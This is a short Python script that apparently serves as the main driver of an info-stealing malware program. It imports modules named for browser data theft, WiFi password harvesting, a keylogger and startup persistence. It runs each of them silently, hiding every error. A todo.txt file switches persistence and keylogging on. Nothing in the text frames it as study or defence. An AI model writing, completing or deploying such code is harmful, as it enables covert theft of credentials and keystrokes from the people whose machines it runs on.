from modules.browser import run
from modules.info import start
from modules.wifi import WifiPasswords
from modules.keylogger import Keylogger
from modules.startup import StartUp


try:
    with open("todo.txt", "r") as f:
        lines = f.readlines()
        keylogger = lines[4]
        Startup = lines[5].strip()
        print(Startup)
        f.close()
except:
    Startup = "null"
    keylogger = "null"


try:
    start()
except:
    pass


try:
    wifi = WifiPasswords()
    wifi.run()
except:
    pass

try:
    run()
except:
    pass

if Startup == "True":
    print("startup")
    try:
        startup = StartUp()
        startup.run()
    except Exception as e:
        pass


if keylogger == "True":
    try:
        keyLogger = Keylogger()
        keyLogger.run()
    except:
        pass
